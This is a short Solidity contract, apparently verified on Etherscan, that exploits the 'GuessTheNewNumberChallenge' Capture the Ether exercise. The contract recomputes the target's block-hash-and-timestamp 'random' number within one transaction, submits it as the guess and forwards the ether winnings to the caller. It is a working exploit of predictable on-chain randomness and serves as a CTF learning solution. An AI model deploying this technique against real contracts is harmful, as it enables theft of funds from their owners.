/**
 *Submitted for verification at Etherscan.io on 2022-04-04
*/

pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge {
    function isComplete() external returns (bool);
    function guess(uint8 n) external payable;
}

contract Hack {
    function Hack() public {
    }

    function checkComp(address addr) public view returns (bool){
        return GuessTheNewNumberChallenge(addr).isComplete();
    }

    function GetNum() public view returns (uint8){
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function GuessOther(address addr) public payable {
        require(msg.value > 1 ether);
        uint8 answer = GetNum();
        GuessTheNewNumberChallenge(addr).guess.value(1 ether)(answer);
        msg.sender.transfer(address(this).balance);
    }

    
}